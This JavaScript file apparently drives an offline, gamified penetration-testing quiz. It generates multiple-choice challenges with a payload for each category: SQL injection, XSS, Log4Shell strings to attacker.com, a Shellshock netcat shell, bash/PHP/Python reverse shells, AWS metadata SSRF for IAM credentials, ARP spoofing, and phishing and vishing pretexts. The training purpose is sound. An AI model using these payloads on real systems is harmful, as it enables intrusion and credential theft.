// @ts-nocheck
// ProceduralAI v3.0 - Enhanced Offline Pentest Challenge Engine
// Cyberpunk Ethical Hacking Training - Full Pentest Resources Activated
// Authorized for complete exploit generation & procedural content

class ProceduralAI {
    constructor() {
        this.categories = {
            // MITRE ATT&CK based categories
            injection: { weight: 25, templates: 25, mitre: 'T1190' },
            xss: { weight: 20, templates: 20, mitre: 'T1059.007' },
            auth: { weight: 15, templates: 18, mitre: 'T1078' },
            rce: { weight: 20, templates: 22, mitre: 'T1059' },
            idor: { weight: 10, templates: 12, mitre: 'T1080' },
            ssrf: { weight: 8, templates: 10, mitre: 'T1552.005' },
            deserialization: { weight: 7, templates: 8, mitre: 'T1059.005' },
            buffer_overflow: { weight: 10, templates: 15, mitre: 'T1068' },
            lfi_rfi: { weight: 12, templates: 14, mitre: 'T1083' },
            csrf: { weight: 8, templates: 10, mitre: 'T1076' },
            open_redirect: { weight: 5, templates: 8, mitre: 'T1566.002' },
            network_hacking: { weight: 15, templates: 10, mitre: 'T1595' },
            api_security: { weight: 12, templates: 10, mitre: 'T1190' },
            cloud_security: { weight: 10, templates: 8, mitre: 'T1078.004' },
            social_engineering: { weight: 8, templates: 6, mitre: 'T1566' },
            cryptography: { weight: 7, templates: 6, mitre: 'T1600' },
            mobile_security: { weight: 8, templates: 6, mitre: 'T1475' },
            // New categories from MITRE ATT&CK
            privilege_escalation: { weight: 12, templates: 10, mitre: 'T1068' },
            defense_evasion: { weight: 15, templates: 12, mitre: 'T1055' },
            credential_access: { weight: 12, templates: 10, mitre: 'T1003' },
            lateral_movement: { weight: 10, templates: 8, mitre: 'T1021' },
            persistence: { weight: 12, templates: 10, mitre: 'T1547' },
            collection: { weight: 8, templates: 6, mitre: 'T1056' },
            exfiltration: { weight: 7, templates: 5, mitre: 'T1041' },
            impact: { weight: 8, templates: 6, mitre: 'T1486' }
        };
        
        this.templates = this.loadTemplates();
        
        this.difficulties = ['iniciante', 'logica', 'massiva'];
        this.usedChallenges = new Set();
        this.playerStats = {
            solved: 0, failed: 0, streak: 0,
            categoryStats: {}, accuracy: 0
        };
        this.cves = this.loadCVEDatabase();
        this.payloads = this.loadPayloadDatabase();
        this.realismFactor = 0.9; // 90% realistic payloads
        this.loadExternalArsenal();
        this.loadProgress();
    }

    async loadExternalArsenal() {
        try {
            const data = window.ARSENAL_DATA;
            if (data && data.challenges) {
                console.log(`[ProceduralAI] Loading ${data.challenges.length} external challenges from static Arsenal.`);
                data.challenges.forEach(ch => {
                    if (!this.templates[ch.category]) this.templates[ch.category] = [];
                    this.templates[ch.category].push(ch);
                });
            }
        } catch (e) {
            console.warn('[ProceduralAI] Static arsenal load failed.');
        }
    }

    generateChallenge(difficulty = 'logica', categoryOverride = null) {
        const cat = categoryOverride || this.weightedCategory();
        
        let challenge;
        const rand = Math.random();
        
        if (rand < 0.3) {
            // 30% chance for Log Analysis
            challenge = this.generateLogChallenge(cat, difficulty);
        } else if (rand < 0.7) {
            // 40% chance for Procedural/Mutated Code
            challenge = this.generateProceduralTemplate(cat, difficulty);
        } else {
            // 30% chance for Classic Template
            const template = this.selectTemplate(cat, difficulty);
            if (!template) {
                challenge = this.generateFallback(cat, difficulty);
            } else {
                challenge = this.populateTemplate(template, cat, difficulty);
            }
        }
        
        if (!challenge) challenge = this.generateFallback(cat, difficulty);
        
        // Adaptive difficulty based on player stats
        challenge.adaptiveLevel = this.calculateAdaptiveLevel(cat);
        challenge.cveReference = this.randomCVE(cat);
        challenge.payloadHint = this.generateHint(challenge);
        
        this.usedChallenges.add(challenge.id);
        return challenge;
    }

    generateProceduralTemplate(cat, diff) {
        const template = this.selectTemplate(cat, diff);
        if (!template) return null;
        
        let mutatedChallenge = { ...template };
        mutatedChallenge.id = `proc-${cat}-${Date.now()}`;
        mutatedChallenge.category = cat;
        mutatedChallenge.difficulty = diff;
        
        const companies = ['CyberCorp', 'GlobalBank', 'TechNova', 'HealthPlus', 'FinStream', 'GovSys'];
        const variables = ['user_id', 'account_num', 'email_address', 'session_token', 'profile_id', 'client_id'];
        const servers = ['Apache/2.4.51', 'Nginx/1.18.0', 'IIS/10.0', 'Tomcat/9.0'];
        
        const company = companies[Math.floor(Math.random() * companies.length)];
        const variable = variables[Math.floor(Math.random() * variables.length)];
        const server = servers[Math.floor(Math.random() * servers.length)];
        
        // Mutate description
        mutatedChallenge.description = `[ALVO: ${company} - Servidor: ${server}] ` + mutatedChallenge.description;
        
        // Mutate code
        if (mutatedChallenge.vulnerableCode) {
            mutatedChallenge.vulnerableCode = mutatedChallenge.vulnerableCode.replace(/id|username|password/gi, variable);
            // Randomly switch quotes to break pattern recognition
            if (Math.random() > 0.5 && !mutatedChallenge.vulnerableCode.includes('`')) {
                mutatedChallenge.vulnerableCode = mutatedChallenge.vulnerableCode.replace(/'/g, '"');
                if (mutatedChallenge.solution && mutatedChallenge.solution.includes("'")) {
                    mutatedChallenge.solution = mutatedChallenge.solution.replace(/'/g, '"');
                }
            }
        }
        
        return mutatedChallenge;
    }

    generateLogChallenge(cat, diff) {
        const companies = ['CyberCorp', 'GlobalBank', 'TechNova', 'HealthPlus', 'FinStream'];
        const company = companies[Math.floor(Math.random() * companies.length)];
        const attackerIP = `185.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
        
        let logLines = [];
        let solution = "";
        let desc = `A equipe SOC da ${company} detectou anomalias nos logs do servidor. Analise o trecho de log e identifique o vetor de ataque.`;
        
        // Generate normal logs
        for(let i=0; i<3; i++) {
            logLines.push(`[INFO] 192.168.1.${10+i} - - "GET /index.html HTTP/1.1" 200 1024`);
        }
        
        // Inject attack log
        if (cat === 'injection' || cat === 'api_security') {
            logLines.push(`[WARN] ${attackerIP} - - "GET /login?user=admin%27%20OR%20%271%27%3D%271 HTTP/1.1" 500 405`);
            solution = "SQL Injection (Authentication Bypass)";
        } else if (cat === 'xss') {
            logLines.push(`[WARN] ${attackerIP} - - "GET /search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E HTTP/1.1" 200 5000`);
            solution = "Reflected XSS";
        } else if (cat === 'lfi_rfi') {
            logLines.push(`[WARN] ${attackerIP} - - "GET /download.php?file=../../../../etc/passwd HTTP/1.1" 200 1204`);
            solution = "Local File Inclusion (Path Traversal)";
        } else if (cat === 'rce') {
            logLines.push(`[WARN] ${attackerIP} - - "POST /api/upload HTTP/1.1" 200 - User-Agent: "() { :;}; /bin/bash -c 'nc -e /bin/sh 10.0.0.1 4444'"`);
            solution = "Remote Code Execution (Shellshock)";
        } else {
            logLines.push(`[WARN] ${attackerIP} - - "GET /admin_panel HTTP/1.1" 401 300`);
            logLines.push(`[WARN] ${attackerIP} - - "POST /admin_panel/login HTTP/1.1" 401 300`);
            logLines.push(`[WARN] ${attackerIP} - - "POST /admin_panel/login HTTP/1.1" 401 300`);
            logLines.push(`[WARN] ${attackerIP} - - "POST /admin_panel/login HTTP/1.1" 200 4500`);
            solution = "Brute Force Authentication";
        }
        
        // Shuffle logs
        const attackLine = logLines.pop();
        logLines.splice(Math.floor(Math.random() * logLines.length), 0, attackLine);
        
        return {
            id: `log-${cat}-${Date.now()}`,
            category: 'log_analysis', // Force distractor category
            difficulty: diff,
            description: desc,
            code: logLines.join("\\n"),
            solution: solution,
            exploitType: "log_analysis"
        };
    }

    // Bridge for offline.js (Refactored for efficiency)
    gerar(config, difficulty = 'logica') {
        const challenge = this.generateChallenge(difficulty);
        const options = new Set();
        options.add(challenge.solution);
        
        const distractors = this.generateDistractors(challenge.category, challenge.solution);
        distractors.forEach(d => options.add(d));
        
        // If we still don't have 4, add generic ones
        const fallbacks = ["' OR 1=1--", "<script>alert(1)</script>", "../../../etc/passwd", "admin'--"];
        let fIdx = 0;
        while (options.size < 4) {
            options.add(fallbacks[fIdx % fallbacks.length]);
            fIdx++;
        }
        
        const generatedOptions = Array.from(options).sort(() => Math.random() - 0.5);
        
        // Reward Scaling based on difficulty
        const rewards = {
            iniciante: { xp: 30, rep: 10 },
            logica: { xp: 75, rep: 25 },
            massiva: { xp: 150, rep: 50 }
        };
        const reward = rewards[difficulty] || rewards.logica;

        return {
            id: challenge.id,
            category: challenge.category,
            difficulty: challenge.difficulty,
            code: challenge.vulnerableCode || challenge.code,
            description: challenge.description,
            options: generatedOptions,
            correct: generatedOptions.indexOf(challenge.solution),
            explain: challenge.payloadHint || `A vulnerabilidade de ${challenge.category.toUpperCase()} permite este exploit: ${challenge.solution}.`,
            cve: challenge.cveReference || null,
            mitre: this.categories[challenge.category]?.mitre || null,
            xp: reward.xp,
            rep: reward.rep
        };
    }

    weightedCategory() {
        const totalWeight = Object.values(this.categories).reduce((sum, c) => sum + c.weight, 0);
        let rand = Math.random() * totalWeight;
        for (const [cat, data] of Object.entries(this.categories)) {
            if (rand < data.weight) return cat;
            rand -= data.weight;
        }
        return 'injection'; // fallback
    }

    selectTemplate(cat, diff) {
        const templates = this.templates[cat] || [];
        if (!templates.length) return null;
        
        // Anti-repeat: exclude recently used
        const available = templates.filter(t => !this.usedChallenges.has(t.id));
        return available.length ? available[Math.floor(Math.random() * available.length)] 
                               : templates[Math.floor(Math.random() * templates.length)];
    }

    generateFallback(cat, diff) {
        return {
            id: `fallback-${Date.now()}`,
            description: `Challenge for ${cat} (${diff})`,
            vulnerableCode: "// Vulnerable pattern detected",
            solution: "exploit",
            exploitType: "generic"
        };
    }

    populateTemplate(template, cat, diff) {
        const challenge = { ...template };
        challenge.id = `${cat}-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
        challenge.difficulty = diff;
        challenge.category = cat;
        challenge.flags = this.generateFlags(diff);
        
        return challenge;
    }

    generateFlags(diff) {
        return [`FLAG{${Math.random().toString(36).substr(2, 12).toUpperCase()}}`];
    }

    randomCVE(cat) {
        const cves = this.cves[cat] || ['CVE-2023-GENERAL'];
        return cves[Math.floor(Math.random() * cves.length)];
    }

    // FULL PENTEST TEMPLATES (Activated Resources)
    loadTemplates() {
        return {
            injection: [
                {
                    id: 'sqli-1', description: 'Formulário de login rejeita suas credenciais. Contorne a autenticação.',
                    vulnerableCode: "SELECT * FROM users WHERE username='{input}' AND password='{input2}'",
                    solution: "admin' OR '1'='1'--", exploitType: 'classic_sqli'
                },
                {
                    id: 'sqli-2', description: 'Extraia a versão do banco de dados via UNION SELECT.',
                    vulnerableCode: "query = \"SELECT * FROM products WHERE name LIKE '%{input}%'\"",
                    solution: "' UNION SELECT @@version,null,null--", exploitType: 'union_sqli'
                },
                {
                    id: 'sqli-log4j', description: 'Vulnerabilidade Log4Shell em aplicação Java legado.',
                    vulnerableCode: "logger.error(\"User input: \" + input);",
                    solution: "${jndi:ldap://attacker.com/a}", exploitType: 'log4shell_rce'
                }
            ],
            xss: [
                {
                    id: 'reflected-1', description: 'A busca reflete o input. Execute alert().',
                    vulnerableCode: '<input value="' + "{input}" + '">',
                    solution: '"><script>alert(\'XSS\')</script>', exploitType: 'reflected_dom'
                },
                {
                    id: 'stored-1', description: 'O comentário persiste no mural. Deface a página.',
                    vulnerableCode: "<div>${comment}</div>",
                    solution: "<script>document.body.innerHTML='<h1>HACKED</h1>'</script>",
                    exploitType: 'stored_xss'
                }
            ],
            rce: [
                {
                    id: 'cmd-1', description: 'Utilitário de Ping permite execução de comandos do sistema.',
                    vulnerableCode: 'system("ping -c 4 " . $_GET[\'host\']);',
                    solution: '127.0.0.1; cat /etc/passwd', exploitType: 'command_injection'
                },
                {
                    id: 'spring4shell', description: 'Vulnerabilidade Spring4Shell (CVE-2022-22965).',
                    vulnerableCode: "public String greeting(@ModelAttribute Greeting greeting) { ... }",
                    solution: "class.module.classLoader.resources.context.parent.pipeline.first.pattern=...", 
                    exploitType: 'spring4shell'
                }
            ],
            buffer_overflow: [
                {
                    id: 'stack-1', description: 'Vulnerabilidade de cópia de buffer. Sobrescreva o endereço de retorno.',
                    vulnerableCode: "char buf[64]; strcpy(buf, input);",
                    solution: "A".repeat(68) + "\\x41\\x42\\x43\\x44", exploitType: 'stack_overflow'
                }
            ],
            idor: [
                {
                    id: 'idor-1', description: 'O sistema permite acessar perfis via ID numérico. Tente acessar o perfil do Admin.',
                    vulnerableCode: "fetch('/api/user/profile?id=' + userId)",
                    solution: "/api/user/profile?id=1", exploitType: 'idor'
                }
            ],
            ssrf: [
                {
                    id: 'ssrf-1', description: 'O serviço de preview de imagem permite URLs externas. Tente acessar o metadata interno.',
                    vulnerableCode: "resp = requests.get(request.args.get('url'))",
                    solution: "http://169.254.169.254/latest/meta-data/", exploitType: 'ssrf'
                }
            ],
            lfi_rfi: [
                {
                    id: 'lfi-1', description: 'Inclusão de arquivo via parâmetro de página. Leia o arquivo /etc/passwd.',
                    vulnerableCode: "include($_GET['page'] . '.php');",
                    solution: "../../../../etc/passwd%00", exploitType: 'lfi'
                }
            ],
            csrf: [
                {
                    id: 'csrf-1', description: 'Alteração de email sem token de proteção. Crie um payload de auto-submissão.',
                    vulnerableCode: "<form action='/update-email' method='POST'>...",
                    solution: "<img src='/update-email?email=hacker@evil.com'>", exploitType: 'csrf'
                }
            ],
            auth: [
                {
                    id: 'auth-1', description: 'Contorne a autenticação via Broken Access Control.',
                    vulnerableCode: "if (user.role == 'admin' || user.id == 1) { ... }",
                    solution: "Cookie: session=eyid:1,role:admin}", exploitType: 'broken_auth'
                }
            ],
            deserialization: [
                {
                    id: 'deserial-1', description: 'Exploração de desserialização insegura em Node.js.',
                    vulnerableCode: "var obj = serialize.unserialize(payload);",
                    solution: "_$$ND_FUNC$$_function(){require('child_process').exec('ls')}", exploitType: 'insecure_deserial'
                }
            ],
            open_redirect: [
                {
                    id: 'redirect-1', description: 'O parâmetro redirect permite domínios externos.',
                    vulnerableCode: "window.location.href = params.get('next');",
                    solution: "https://evil-attacker.com", exploitType: 'open_redirect'
                }
            ],
            xxe: [
                {
                    id: 'xxe-1', description: 'Injeção de Entidade Externa XML para ler arquivos locais.',
                    vulnerableCode: "xmlDoc.loadXML(xmlString);",
                    solution: "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>", exploitType: 'xxe'
                }
            ],
            network_hacking: [
                {
                    id: 'net-1', description: 'Realize reconhecimento de rede. Identifique portas abertas no alvo 192.168.1.1.',
                    vulnerableCode: "# Target: 192.168.1.1\n# Objetivo: Descubra serviços expostos\n$ nmap [flags] 192.168.1.1",
                    solution: "nmap -sV -sC -A 192.168.1.1", exploitType: 'network_recon',
                    mitre: 'T1046 - Network Service Scanning'
                },
                {
                    id: 'net-2', description: 'Ataque ARP Spoofing para interceptar tráfego na LAN.',
                    vulnerableCode: "# Rede: 192.168.0.0/24\n# Gateway: 192.168.0.1\n# Vítima: 192.168.0.10\n$ arpspoof [flags] -i eth0",
                    solution: "arpspoof -i eth0 -t 192.168.0.10 192.168.0.1", exploitType: 'arp_spoofing',
                    mitre: 'T1557 - Adversary-in-the-Middle'
                },
                {
                    id: 'net-3', description: 'Sniffing de credenciais em tráfego HTTP não criptografado.',
                    vulnerableCode: "POST /login HTTP/1.1\nHost: internal.corp.com\nContent-Type: application/x-www-form-urlencoded\n\nusername=admin&password=???",
                    solution: "tcpdump -i eth0 -A 'port 80' | grep -i 'password'", exploitType: 'credential_sniffing',
                    mitre: 'T1040 - Network Sniffing'
                }
            ],
            api_security: [
                {
                    id: 'api-1', description: 'API sem rate limiting permite enumerar IDs de usuários.',
                    vulnerableCode: "GET /api/v1/users/{id}\nAuthorization: Bearer eyJhbGciOiJub25lIn0.e30.",
                    solution: "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiIxIn0.", exploitType: 'broken_api_auth',
                    mitre: 'T1078 - Valid Accounts'
                },
                {
                    id: 'api-2', description: 'Vulnerabilidade de Mass Assignment: API aceita campos extras não esperados.',
                    vulnerableCode: "PUT /api/v1/profile\nBody: {\"name\": \"hacker\", \"role\": \"user\"}",
                    solution: "{\"name\": \"hacker\", \"role\": \"admin\", \"isVerified\": true}", exploitType: 'mass_assignment',
                    mitre: 'T1548 - Abuse Elevation Control Mechanism'
                },
                {
                    id: 'api-3', description: 'JWT com algoritmo "none" permite bypass de autenticação.',
                    vulnerableCode: "// Token atual:\n// Header: {\"alg\":\"HS256\",\"typ\":\"JWT\"}\n// Payload: {\"sub\":\"guest\",\"role\":\"user\"}",
                    solution: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.", exploitType: 'jwt_none_alg',
                    mitre: 'T1600 - Weaken Encryption'
                }
            ],
            cloud_security: [
                {
                    id: 'cloud-1', description: 'SSRF para acessar serviço de metadata da AWS e roubar credenciais IAM.',
                    vulnerableCode: "# Endpoint vulnerável a SSRF:\nGET /fetch?url=http://???/latest/meta-data/iam/security-credentials/",
                    solution: "http://169.254.169.254/latest/meta-data/iam/security-credentials/", exploitType: 'cloud_ssrf',
                    mitre: 'T1552.005 - Cloud Instance Metadata API'
                },
                {
                    id: 'cloud-2', description: 'Bucket S3 com permissão pública permite listar e baixar dados sensíveis.',
                    vulnerableCode: "# Bucket: s3://corp-backups-prod\n# ACL: public-read\n$ aws s3 [comando] s3://corp-backups-prod",
                    solution: "aws s3 ls s3://corp-backups-prod --no-sign-request", exploitType: 's3_misconfiguration',
                    mitre: 'T1530 - Data from Cloud Storage'
                }
            ],
            social_engineering: [
                {
                    id: 'se-1', description: 'Construa um email de phishing convincente para obter credenciais do alvo.',
                    vulnerableCode: "# Alvo: CEO João Silva <joao.silva@corp.com>\n# Domínio legítimo: corp.com\n# Domínio falso: ???\n# Pretexto: 'Atualização urgente de senha corporativa'",
                    solution: "c0rp.com (homoglyph attack: substituindo 'o' por '0')", exploitType: 'phishing_domain',
                    mitre: 'T1566.001 - Spearphishing Attachment'
                },
                {
                    id: 'se-2', description: 'Ataque de pretexting: um "técnico de TI" liga pedindo senha temporária.',
                    vulnerableCode: "// Vetor: Engenharia Social por telefone\n// Pretexto: 'Suporte Técnico urgente'\n// Alvo: Funcionário do helpdesk\n// Objetivo: Obter reset de senha do CEO",
                    solution: "Vishing com spoofing de caller ID do número interno de TI", exploitType: 'vishing',
                    mitre: 'T1598 - Phishing for Information'
                }
            ],
            cryptography: [
                {
                    id: 'crypto-1', description: 'Aplicação usa MD5 para hash de senhas. Quebre o hash do admin.',
                    vulnerableCode: "# Hash encontrado no banco:\n# admin: 5f4dcc3b5aa765d61d8327deb882cf99\n# Algoritmo: MD5 (sem salt)\n$ hashcat -m [modo] hash.txt wordlist.txt",
                    solution: "hashcat -m 0 5f4dcc3b5aa765d61d8327deb882cf99 rockyou.txt", exploitType: 'weak_hash_cracking',
                    mitre: 'T1110.002 - Password Cracking'
                },
                {
                    id: 'crypto-2', description: 'Ataque Padding Oracle: decripte dados criptografados com CBC sem autenticação.',
                    vulnerableCode: "# Token de sessão (base64):\n# K2NyeXB0b3MgaXMgaGFyZA==\n# Cifra: AES-128-CBC\n# IV: 0000000000000000\n# Sem HMAC de autenticação",
                    solution: "padbuster http://alvo.com/token K2NyeXB0b3MgaXMgaGFyZA== 16", exploitType: 'padding_oracle',
                    mitre: 'T1600 - Weaken Encryption'
                }
            ],
            mobile_security: [
                {
                    id: 'mob-1', description: 'App Android exporta Activity sem permissão. Acesse dados do usuário.',
                    vulnerableCode: "<!-- AndroidManifest.xml -->\n<activity android:name=\".AdminActivity\"\n          android:exported=\"true\">\n</activity>",
                    solution: "adb shell am start -n com.target.app/.AdminActivity", exploitType: 'intent_hijacking',
                    mitre: 'T1426 - System Information Discovery'
                },
                {
                    id: 'mob-2', description: 'WebView no app carrega URLs externas sem validação. Execute XSS.',
                    vulnerableCode: "webView.loadUrl(getIntent().getStringExtra(\"url\"));\nwebView.getSettings().setJavaScriptEnabled(true);",
                    solution: "javascript:alert(document.cookie)", exploitType: 'webview_xss',
                    mitre: 'T1411 - User Interface Spoofing'
                }
            ]
        };
    }

    // REAL EXPLOIT PAYLOADS (Production-Ready)
    loadPayloadDatabase() {
        return {
            reverse_shells: {
                bash: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
                php: "php -r '$sock=fsockopen(\"10.0.0.1\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
                python: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/sh\")'"
            }
        };
    }

    loadCVEDatabase() {
        return {
            injection: ['CVE-2024-21514 (OpenCart SQLi)', 'CVE-2021-22986 (F5 BIG-IP)', 'CVE-2021-44228 (Log4Shell)'],
            xss: ['CVE-2023-28121 (WooCommerce XSS)', 'CVE-2024-4358 (Telerik XSS)', 'CVE-2022-3602 (OpenSSL)'],
            rce: ['CVE-2021-44228 (Log4Shell RCE)', 'CVE-2022-22965 (Spring4Shell)', 'CVE-2024-24813 (Apache Tomcat RCE)', 'CVE-2025-53770 (SharePoint RCE)'],
            auth: ['CVE-2024-55591 (FortiOS Auth Bypass)', 'CVE-2024-45409 (Ruby-SAML Bypass)', 'CVE-2025-29927 (Next.js Middleware Bypass)'],
            ssrf: ['CVE-2021-26855 (ProxyLogon SSRF)', 'CVE-2019-11043 (PHP-FPM SSRF)'],
            lfi_rfi: ['CVE-2024-38475 (Apache mod_rewrite)', 'CVE-2021-41773 (Apache Path Traversal)'],
            deserialization: ['CVE-2015-4852 (Java Deserialization)', 'CVE-2020-2555 (Oracle Coherence)'],
            buffer_overflow: ['CVE-2021-3156 (Sudo Heap BoF)', 'CVE-2023-4911 (Looney Tunables glibc)'],
            network_hacking: ['CVE-2024-3400 (PAN-OS Command Injection)', 'CVE-2023-20198 (Cisco IOS XE)'],
            api_security: ['CVE-2023-25690 (Apache HTTP API)', 'CVE-2024-27198 (JetBrains TeamCity)'],
            cloud_security: ['CVE-2022-47939 (AWS Log4j)', 'CVE-2023-44487 (HTTP/2 Rapid Reset - DDoS)'],
            social_engineering: ['MITRE T1566 (Phishing)', 'MITRE T1598 (Spearphishing via Service)'],
            cryptography: ['CVE-2023-0286 (OpenSSL X.509 Overflow)', 'CVE-2022-0778 (OpenSSL Infinite Loop)'],
            mobile_security: ['CVE-2023-41064 (Apple WebKit RCE)', 'CVE-2023-32434 (iOS Kernel Priv Esc)']
        };
    }

    calculateAdaptiveLevel(category) {
        const stats = this.playerStats.categoryStats[category] || { solved: 0, failed: 0 };
        const total = stats.solved + stats.failed;
        if (total === 0) return 'iniciante';
        const ratio = stats.solved / total;
        
        if (ratio > 0.8 && total > 5) return 'massiva';
        if (ratio > 0.5) return 'logica';
        return 'iniciante';
    }

    recordAttempt(challengeId, success) {
        if (success) {
            this.playerStats.solved++;
            this.playerStats.streak++;
        } else {
            this.playerStats.failed++;
            this.playerStats.streak = 0;
        }
        
        const cat = challengeId.split('-')[0];
        this.playerStats.categoryStats[cat] = this.playerStats.categoryStats[cat] || {solved:0,failed:0};
        this.playerStats.categoryStats[cat][success ? 'solved' : 'failed']++;
        
        const total = this.playerStats.solved + this.playerStats.failed;
        this.playerStats.accuracy = total > 0 ? (this.playerStats.solved / total * 100) : 0;
    }

    generateHint(challenge) {
        const hints = {
            injection: "Use sqlmap: sqlmap -u 'http://alvo.com/page?id=1' --dbs. Tente OR 1=1, UNION SELECT ou Blind SQLi.",
            xss: "Burp Suite > Intercept > Modifique o parâmetro. Tente <script>, <img onerror=>, <svg onload=>.",
            rce: "Separadores de comando: ; | && ||. Use Metasploit: search cmd_injection. Tente concatenar comandos.",
            buffer_overflow: "Use pattern_create do Metasploit para calcular offset. Sobrescreva EIP com endereço de retorno.",
            auth: "Tente manipular cookies/tokens. Use Burp Repeater para testar diferentes valores de sessão.",
            ssrf: "Alvos internos: 127.0.0.1, 169.254.169.254 (AWS metadata), 10.0.0.1. Use schemas file://, dict://.",
            lfi_rfi: "Tente ../../../etc/passwd, path traversal com %2e%2e%2f, e null byte %00 para bypass.",
            csrf: "Crie um formulário HTML auto-submit apontando para a ação vulnerável sem verificação de token.",
            deserialization: "Identifique o formato (Java, PHP, Python Pickle). Use ysoserial para Java. Gere gadget chains.",
            idor: "Modifique IDs numéricos, GUIDs, hashes. Use Burp Intruder para enumerar referências de objetos.",
            network_hacking: "Use nmap -sV -sC para reconhecimento. Para MITM: arpspoof + Wireshark/tcpdump para captura.",
            api_security: "Teste JWT em jwt.io. Tente alg=none. Burp Suite para interceptar e modificar chamadas de API.",
            cloud_security: "SSRF para 169.254.169.254. AWS CLI para testar permissões: aws s3 ls --no-sign-request.",
            social_engineering: "Crie pretexto convincente. Pesquise o alvo no LinkedIn/OSINT. Use typosquatting de domínio.",
            cryptography: "Use hashcat com wordlists rockyou.txt. Identifique o algoritmo pelo tamanho/formato do hash.",
            mobile_security: "Use adb para inspecionar apps Android. Jadx/APKTool para decompilação. Frida para hooking."
        };
        return hints[challenge.category] || "Analise o padrão de código vulnerável fornecido e identifique o vetor de ataque.";
    }

    saveProgress() {
        localStorage.setItem('proc_ai_stats', JSON.stringify(this.playerStats));
        localStorage.setItem('proc_ai_used', JSON.stringify([...this.usedChallenges]));
    }

    loadProgress() {
        const stats = localStorage.getItem('proc_ai_stats');
        const used = localStorage.getItem('proc_ai_used');
        if (stats) this.playerStats = JSON.parse(stats);
        if (used) this.usedChallenges = new Set(JSON.parse(used));
    }

    // Removed duplicate gerar method

    generateDistractors(category, correctAnswer) {
        const distractors = [];
        const pool = this.getWrongPool(category);
        const shuffled = pool.filter(o => o !== correctAnswer).sort(() => Math.random() - 0.5);
        return shuffled.slice(0, 3);
    }

    getWrongPool(category) {
        const pools = {
            injection: ["' OR 'a'='b'", "admin'-- -", "1; SLEEP(5)", "' AND 1=0--", "') OR ('1'='1", "UNION SELECT 1,2,3--"],
            xss: ["<img src=x>", "javascript:void(0)", "<svg onload=alert(2)>", "'; alert(1); //", "<iframe src='javascript:alert(1)'>"],
            auth: ["admin:admin", "123456", "password", "root:root", "guest:guest"],
            rce: ["/etc/passwd", "; id", "system('ls')", "eval('1+1')", "exec('/bin/bash')"],
            idor: ["?id=0", "?user=admin", "?uid=1337", "/profile/test", "/api/v1/debug"],
            api_security: ["Bearer token123", "Authorization: Basic Og==", "X-Admin: true", "api_key=test"],
            network_hacking: ["nmap -sS", "ping -f", "hping3 --flood", "netdiscover -r 192.168.1.0/24"],
            ssrf: ["http://localhost:80", "file:///etc/hosts", "gopher://localhost:70", "http://127.0.0.1:22"],
            lfi_rfi: ["/var/log/apache2/access.log", "C:\\Windows\\win.ini", "../../../.env", "/proc/self/environ"],
            log_analysis: ["DDoS Attack (UDP Flood)", "Phishing via Email", "Port Scanning (Nmap)", "Privilege Escalation", "Zero-Day Exploit", "DNS Exfiltration", "Cross-Site Scripting (XSS)"]
        };
        return pools[category] || ["Exploit Genérico #1", "Exploit Genérico #2", "Exploit Genérico #3", "Exploit Genérico #4"];
    }

    generateWrongAnswer(category, correctAnswer) {
        const wrongAnswers = {
            injection: ["' OR 'a'='b'", "admin'-- -", "1; SLEEP(5)", "' AND 1=0--", "') OR ('1'='1"],
            xss: ["<img src=x>", "javascript:void(0)", "<svg onload=alert(2)>", "'; alert(1); //"],
            rce: ["&& ls", "| whoami", "`id`", "$(test)", "; cat /etc/shadow"],
            buffer_overflow: ["A".repeat(32), "B".repeat(64), "\\x90".repeat(10), "0xdeadbeef", "BBBB".repeat(10)],
            idor: ["?id=0", "?user=guest", "?profile=null", "/api/v1/debug"],
            ssrf: ["http://localhost:8080", "file:///etc/hosts", "dict://127.0.0.1:11211", "http://127.0.0.1/admin"],
            lfi_rfi: ["index.php", "config.php", "/var/www/html/index.php", "php://filter/read=convert.base64-encode/resource=config"],
            csrf: ["<form>", "submit()", "fetch('/api')", "XMLHttpRequest.send()"],
            auth: ["Cookie: user=guest", "Header: X-Auth-False", "Session: {id:0}", "Token: null"],
            deserialization: ["{\"user\":\"admin\"}", "O:4:\"Test\":0:{}", "new Buffer('abc')", "eval('1+1')"],
            open_redirect: ["/logout", "/home", "http://internal-site.local", "javascript:history.back()"],
            xxe: ["<!ENTITY test '123'>", "<foo>bar</foo>", "<?xml version='1.1'?>", "<!ELEMENT doc ANY>"],
            network_hacking: ["nmap -sP 192.168.1.1", "ping 192.168.1.1", "traceroute 192.168.1.1", "netstat -an"],
            api_security: ["{\"role\": \"moderator\"}", "Authorization: Basic YWRtaW46", "X-API-Key: test123", "Bearer null"],
            cloud_security: ["http://localhost/metadata", "http://192.168.0.1/admin", "file:///etc/hosts", "aws sts get-caller-identity"],
            social_engineering: ["c0rp.net", "corp-security.com", "corp.com.evil.io", "corp-it-support.xyz"],
            cryptography: ["hashcat -m 100", "hashcat -m 1000", "hashcat -m 1400", "john hash.txt --wordlist=rockyou.txt"],
            mobile_security: ["adb shell dumpsys", "adb shell ps", "adb pull /data/data/", "frida -U -l hook.js"]
        };
        
        const choices = wrongAnswers[category] || ["Opção inválida 1", "Opção inválida 2", "Opção inválida 3", "Opção inválida 4"];
        return choices[Math.floor(Math.random() * choices.length)];
    }
}

// GLOBAL INSTANCE
const procAI = new ProceduralAI();

// Initialize on DOM load
document.addEventListener('DOMContentLoaded', () => {
    procAI.loadProgress();
    
    // Auto-save every 30s
    setInterval(() => procAI.saveProgress(), 30000);
});

// Export
window.ProceduralAI = ProceduralAI;
window.procAI = procAI;

